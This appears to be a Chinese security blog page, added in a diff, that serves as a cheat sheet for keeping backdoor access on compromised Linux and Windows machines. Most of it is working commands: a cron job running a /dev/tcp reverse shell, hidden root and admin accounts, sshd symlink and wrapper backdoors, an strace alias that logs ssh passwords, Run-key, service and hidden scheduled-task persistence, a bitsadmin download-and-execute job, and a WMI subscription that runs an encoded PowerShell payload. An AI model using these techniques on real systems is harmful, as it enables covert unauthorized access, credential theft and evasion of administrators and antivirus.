@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>win\&linux本地权限维持 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "win\\\u0026amp;linux\u672c\u5730\u6743\u9650\u7ef4\u6301", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "LINUX", url: "#linux" },
+              {title: "WINDOWS", url: "#windows" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../../%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../../%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC/" class="btn btn-xs btn-link">
+        钓鱼
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="btn btn-xs btn-link">
+        权限维持
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="winlinux">win\&amp;linux本地权限维持</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#LINUX">LINUX</a><ul>
+<li><a href="#cron">cron</a></li>
+<li><a href="#隐藏文件">隐藏文件</a></li>
+<li><a href="#创建恶意管理员用户">创建恶意管理员用户</a></li>
+<li><a href="#时间戳修改">时间戳修改</a></li>
+<li><a href="#inetd">inetd</a></li>
+<li><a href="#快速获取ssh链接软连接后门">快速获取ssh链接(软连接后门)</a></li>
+<li><a href="#Wrapper后门">Wrapper后门</a></li>
+<li><a href="#SSH-keylogger">SSH keylogger</a></li>
+</ul>
+</li>
+<li><a href="#WINDOWS">WINDOWS</a><ul>
+<li><a href="#影子用户">影子用户</a><ul>
+<li><a href="#-符号">\$ 符号</a></li>
+<li><a href="#修改注册表">修改注册表</a></li>
+</ul>
+</li>
+<li><a href="#启动项">启动项</a><ul>
+<li><a href="#开始菜单启动项">开始菜单启动项</a></li>
+<li><a href="#启动项注册表后门">启动项注册表后门</a></li>
+</ul>
+</li>
+<li><a href="#服务">服务</a></li>
+<li><a href="#计划任务">计划任务</a><ul>
+<li><a href="#隐藏">隐藏</a></li>
+</ul>
+</li>
+<li><a href="#Logon-Scripts">Logon Scripts</a></li>
+<li><a href="#组策略后门">组策略后门</a></li>
+<li><a href="#启用GUEST">启用GUEST</a></li>
+<li><a href="#BITSADMIN后门">BITSADMIN后门</a></li>
+<li><a href="#WMI">WMI</a><ul>
+<li><a href="#使用WMI存储信息">使用WMI存储信息</a></li>
+<li><a href="#过滤器处理器">过滤器+处理器</a></li>
+</ul>
+</li>
+<li><a href="#文件隐藏">文件隐藏</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<h2 id="linux">LINUX</h2>
+<h3 id="cron">cron</h3>
+<p>创建个文件（假设为/a/b)，里面的核心内容是弹个shell回来
+（最好在文件前加上#!/bin/bash）</p>
+<p>然后chmod +xs /a/b</p>
+<p>然后修改/etc/crontab,这里是每分钟执行一次</p>
+<pre><code class="language-text">*/1 * * * * root /a/b
+</code></pre>
+<p>当然，也可以无文件落地。
+但是需要修改一个地方
+vim /etc/crontab
+将SEHLL改为/bin/bash</p>
+<p><img alt="image-20210803131457514" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210803131457514.png" title="image-20210803131457514" /></p>
+<p>然后写入 bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1</p>
+<h3 id="_2">隐藏文件</h3>
+<p>创建.xxx文件即为隐藏文件，ls是看不到的，只有通过ls -al才能看到</p>
+<p>网上还看到一个创建文件名字为...的方法，不知道实用性如何</p>
+<h3 id="_3">创建恶意管理员用户</h3>
+<p>useradd -o -u 0 backdoor
+然后为其设置个密码以便ssh登录，登上去就是root</p>
+<h3 id="_4">时间戳修改</h3>
+<p>后门的时间戳需要改改，不然太容易被看出来，别人一个ls -al就看破了</p>
+<pre><code class="language-text">touch -r index.php webshell.php 将index.php的时间赋予webshell.php
+touch -t 1401021042.30 webshell.php 2014年1月2日10点42分30秒赋予webshell.php
+</code></pre>
+<h3 id="inetd">inetd</h3>
+<p>需要inetd被安装</p>
+<pre><code class="language-text">apt-get install openbsd-inetd
+</code></pre>
+<p>修改文件/etc/inetd.conf</p>
+<p><img alt="image-20210803141045480" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210803141045480.png" title="image-20210803141045480" /></p>
+<p>然后重启inetd</p>
+<pre><code class="language-text">ps -ef | grep inetd
+root        1928    1470  0 14:20 pts/0    00:00:00 grep inetd
+
+kill 1928
+</code></pre>
+<p>然后另一台主机 nc -vv ip 13(默认端口13)
+即可获得以下场景</p>
+<p><img alt="image-20210803142658280" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210803142658280.png" title="image-20210803142658280" /></p>
+<p>默认端口改法:</p>
+<p>修改/etc/services文件，加入以下的东西</p>
+<pre><code class="language-text">test 6666/tcp
+</code></pre>
+<p>然后修改/etc/inetd.conf ,在daytime附近</p>
+<p>test stream tcp nowait root /bin/bash bash -i</p>
+<p><img alt="image-20210803142955931" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210803142955931.png" title="image-20210803142955931" /></p>
+<h3 id="ssh">快速获取ssh链接(软连接后门)</h3>
+<pre><code class="language-text">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337; 受害机上执行
+</code></pre>
+<p>然后我们</p>
+<pre><code class="language-text">ssh root@xxx.x.x.xx -p 31337
+</code></pre>
+<p>随便输个密码就进去了</p>
+<h3 id="wrapper">Wrapper后门</h3>
+<pre><code class="language-text">cd /usr/sbin
+mv sshd ../bin
+echo '#!/usr/bin/perl' &gt;sshd
+
+echo 'exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd
+
+echo 'exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,' &gt;&gt;sshd
+chmod u+x sshd
+//不用重启也行
+/etc/init.d/sshd restart
+</code></pre>
+<p>kali下的执行</p>
+<pre><code class="language-text">##!bash
+socat STDIO TCP4:192.168.206.142:22,sourceport=13377
+即可开始控制
+</code></pre>
+<pre><code class="language-text">源端口修改
+##!python
+&gt;&gt;&gt; import struct
+&gt;&gt;&gt; buffer = struct.pack('&gt;I6',19526)
+&gt;&gt;&gt; print repr(buffer)
+'\x00\x00LF'
+&gt;&gt;&gt; buffer = struct.pack('&gt;I6',13377)
+&gt;&gt;&gt; print buffer
+4A
+
+</code></pre>
+<p><img alt="" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210804162106319.png" /></p>
+<p>没有链接的情况下是无法看到进程的，last也看不到登录，很隐蔽</p>
+<h3 id="ssh-keylogger">SSH keylogger</h3>
+<p>vim当前用户的.bashrc文件 \~/.bashrc，末尾添加</p>
+<pre><code class="language-text">alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh'
+</code></pre>
+<p>然后执行命令 source .bashrc,使配置生效。</p>
+<p>随后当本地su或者ssh时，操作记录就会被记录到/tmp目录下。</p>
+<p><img alt="image-20210804163128260" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210804163128260.png" title="image-20210804163128260" /></p>
+<h2 id="windows">WINDOWS</h2>
+<h3 id="_5">影子用户</h3>
+<h4 id="_6">\$ 符号</h4>
+<pre><code class="language-text">net user ddd$ /add
+net localgroup administrators ddd$ /add
+</code></pre>
+<p>这样的话，net user命令就看不到这个用户了
+但是其他如注册表，用户管理界面和登陆界面都会发现此用户，所以说隐蔽性不高。</p>
+<h4 id="_7">修改注册表</h4>
+<p>我们要对HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User 进行一些修改，但是默认这有SYSTEM可以修改SAM。所以我们需要修改一下相关权限：看图说话</p>
+<p><img alt="image-20210725215111868" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210725215111868.png" title="image-20210725215111868" /></p>
+<p><img alt="image-20210725215133627" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210725215133627.png" title="image-20210725215133627" /></p>
+<p>在names中找到隐藏用户对应的值，然后去上层比对。</p>
+<p><img alt="image-20210726112022028" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726112022028.png" title="image-20210726112022028" /></p>
+<p>可以发现隐藏用户的值为3f0。接下来我们把1f4（管理员表项）的F值复制到3f0中。</p>
+<p><img alt="image-20210726112139132" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726112139132.png" title="image-20210726112139132" /></p>
+<p>复制后，将3f0和匿名用户的表项右键导出。
+然后把我们的匿名用户删除</p>
+<p><img alt="image-20210726112648019" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726112648019.png" title="image-20210726112648019" /></p>
+<p>然后双击两个导出的表项.</p>
+<p>这样的话，我们这个匿名用户就只有在注册表可见了。</p>
+<h3 id="_8">启动项</h3>
+<h4 id="_9">开始菜单启动项</h4>
+<pre><code class="language-text">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start   Menu\Programs\Startup
+</code></pre>
+<p>有些时候这个文件夹会改变，可以通过以下注册表键值来确定</p>
+<pre><code class="language-text">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User   Shell Folders 
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell   Folders 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell   Folders 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User   Shell Folders
+</code></pre>
+<p>把应用程序的快捷方式放进去有效，但是直接放应用程序进去就会失效。</p>
+<h4 id="_10"><strong>启动项注册表后门</strong></h4>
+<pre><code class="language-text">HKEY_LOCAL_MACHINE\SOFTWARE\Microft\windows\currentversion\run
+</code></pre>
+<p>命令</p>
+<pre><code class="language-text">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\test.bat&quot; /f
+</code></pre>
+<h3 id="_11">服务</h3>
+<p>服务后门往往拥有SYSTEM权限</p>
+<pre><code class="language-text">将exe木马添加到自启动服务中 
+
+sc create &quot;GoogleUpdated&quot; binpath=   &quot;C:\Users\Administrator\Desktop\test.exe&quot; 
+
+sc description &quot;GoogleUpdated&quot;   &quot;description&quot; 设置服务的描述字符串 
+
+sc config &quot;GoogleUpdated&quot;   start= auto  设置这个服务为自动启动 
+net start &quot;GoogleUpdated&quot;   启动服务
+</code></pre>
+<p>如果直接用普通后门来做服务后门，那么就会出问题：
+windows下的服务启动后若未在一定时间内与服务中心通信则会被终止。</p>
+<p>但是CS可以直接生成服务马。</p>
+<h3 id="_12">计划任务</h3>
+<pre><code class="language-text">schtasks /create /sc minute /mo 5   /tn &quot;chrome&quot; /tr c:\test.bat
+
+schtasks /create /sc minute /mo 1 /tn &quot;chrome&quot; /tr wscript.exe C:\Users\AppData\Local\Temp\13442980_crypted.vbs
+
+schtasks /create /tn foo1 /tr C:\Windows\apppatch\windows.exe /sc once /st 05:25 /S 18.217.*.* /RU System
+
+schtasks /create /s 192.168.1.2 /u administrator /p Passw0rd! /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\wmpub\add.bat/F
+
+schtasks /create /s 192.168.1.2 /u administrator/p Passw0rd! /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr \\192.168.1.2\c$\windows\beacon.exe
+
+schtasks /run /s 192.168.1.2 /u administrator /pPassw0rd! /tn adduser /i
+</code></pre>
+<p>/s指定远程机器名或ip地址，/ru指定运行任务的用户权限，这里指定为最高的<strong>SYSTEM</strong>，/tn是任务名称，/sc是任务运行频率，这里指定为每天运行，并没什么实际意义，/tr指定运行的文件，/F表示如果指定的任务已经存在，则强制创建任务并抑制警告。/i表示<strong>立即运行</strong></p>
+<h4 id="_13">隐藏</h4>
+<p>修改HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\test中任务对应的index值（默认3），修改为0。无法修改时需要更改权限，将所有者改为administrators，并赋予所有权限。
+赋予为0后无法直接查看任务。
+这样schtasks和任务查看器均不能看见此任务。
+此外win10还可以删除C:\Windows\System32\Tasks 下对应任务名的文件，以便达到更好的隐藏目的。（win10以外版本 删除此文件会导致任务无法运行）
+但这种隐藏方式可以用命令 schtasks /query /tn 任务名来查看（任务名可以通过注册表查看）。</p>
+<p>为了避免被这样排查出来，在win10下可以删除C:\Windows\System32\Tasks 下对应文件并删除HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\test中SD值</p>
+<h3 id="logon-scripts">Logon Scripts</h3>
+<p>Logon Scripts优先于 av 先执行，我们可以利用这一点来绕过 av 的敏感操作拦截</p>
+<p>在HKEY_CURRENT_USER\Environment表项创建一个值为 UserInitMprLogonScript ,值为我们要启动的程序路径。</p>
+<p><img alt="image-20210726121119752" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726121119752.png" title="image-20210726121119752" /></p>
+<p>用户重新登陆后后门被启动。</p>
+<p>WIN7可行</p>
+<h3 id="_14">组策略后门</h3>
+<p>开始-&gt;运行-&gt;键入"gpedit.msc"-&gt;本地组策略编辑器-&gt;window设置(system)-&gt;脚本-&gt;启动-&gt;属性</p>
+<p>点击显示文件:</p>
+<pre><code class="language-text">C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup
+</code></pre>
+<p>把我们的后门程序复制到这个路径,然后这个脚本开机就会自动加载执行了。</p>
+<p>win7下复现失败。反正有这个玩意，我看别人拿2003复现成功了，容易被查杀。</p>
+<p>当然也可以在域控机器上通过组策略下发此脚本来使域中人员登陆时上线。不过这不在本文讨论范畴之内了。</p>
+<h3 id="guest">启用GUEST</h3>
+<p>Guest用户本身就存在于计算机中，但是一般默认禁止，且不可登录，我们可以通过命令激活Guest用户并赋予管 理员权限，并允许远程桌面登录。</p>
+<pre><code class="language-text">net user Guest /active:yes
+net user Guest guest@123456
+net localgroup Administrators Guest /ADD
+</code></pre>
+<p>gpedit.msc-&gt;计算机配置-&gt;windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配-&gt;允许通过远程桌面服务登录 添加Guest</p>
+<h3 id="bitsadmin">BITSADMIN后门</h3>
+<p>bitsadmin指令一般是用于下载文件的，但它也可以用于持久化。</p>
+<p>bitsadmin的SetNotifyCmdLine参数意是用于下载文件后紧随其后调用一个命令，但是这个参数被黑客利用后就成了一个很不错的后门。</p>
+<pre><code class="language-text">bitsadmin /create backdoor 创建一个bitsadmin任务backdoor
+bitsadmin /addfile backdoor http://a.com/a.exe c:\temp\a.exe 添加一个任务列表，将远程（本地）的一个文件下载到本地
+bitsadmin /SetNotifyCmdLine backdoor c:\users\hacker\evil.exe nul    倒数第二个参数是要打开的应用程式，倒数第一个参数是打开文件时附加的参数
+bitsadmin /SetMinRetryDelay &quot;backdoor&quot; 60  每60秒重试任务
+bitsadmin /resume backdoor  调用指定任务
+</code></pre>
+<p>我们执行完以上指令后，会马上命令执行一次（SetNotifyCmdLine中指定的cmd命令，这里我们就是仅仅执行了我们的恶意EXE）。</p>
+<p>重启后发现任务依然存在</p>
+<p><img alt="image-20210731220643989" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210731220643989.png" title="image-20210731220643989" /></p>
+<p>按理说每隔一段时间我的马就会被执行一次，但实际上并没有，不知道为何。</p>
+<h3 id="wmi">WMI</h3>
+<h4 id="wmi_1">使用WMI存储信息</h4>
+<p>你可以用WMI来存储你的shellcode,恶意文件路径等，这种存储方式相对来说比较隐蔽</p>
+<pre><code class="language-text">$StaticClass = New-Object Management.ManagementClass('root\cimv2',$null,$null) #新建wmi类
+$StaticClass.Name = &quot;a&quot; #设置wmi类名
+$StaticClass.Properties.Add('key',&quot;shellcode&quot;) #设置wmi属性键值
+$StaticClass.put() #提交以上更改
+
+##访问信息
+([WmiClass] 'a').Properties['key'].Value
+</code></pre>
+<h4 id="_15">过滤器+处理器</h4>
+<p>这个后门是这么实现的</p>
+<p>1.设定一个事件过滤器，用于监听事件如开机，启动某应用等等
+2.设定一个事件处理器，用于设置监听到某事件发生后所采取的行动
+3.将过滤器和处理器绑定在一起</p>
+<pre><code class="language-text">$$EncodedPayload=&quot;&quot;
+
+## 构造 WMI永久事件订阅(permanent event subscriptions) 
+$filterName='EvilFilter'
+$consumerName='EvilConsumer'
+
+## 1. 创建一个 事件过滤器__EventFilter,用于设定触发条件,每隔60s执行一次
+$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'&quot;
+## or $Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 200 AND TargetInstance.SystemUpTime &lt; 320&quot;
+## 事件筛选器在系统启动后的 200 和 320 秒之间被当作一个触发器。在事件被触发时事件消费者会使用 CommandLineEventConsumer 执行已指定好的可执行文件。
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @{Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query} -ErrorAction Stop
+
+## 2. 创建一个 事件消费者 CommandLineEventConsumer ,用于设定执行的操作
+$Arg =@{Name=$consumerName;CommandLineTemplate=&quot;C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe  -NonInteractive  -enc $EncodedPayload&quot;}
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments $Arg
+
+## 3. 绑定filter和consumer
+
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
+</code></pre>
+<h3 id="_16">文件隐藏</h3>
+<pre><code class="language-text">attrib +s +h ./a
++s:设置为系统文件，更具有迷惑性，且权限较高
++h:隐藏文件
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../../%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../../%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC/" class="btn btn-xs btn-link">
+        钓鱼
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="btn btn-xs btn-link">
+        权限维持
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
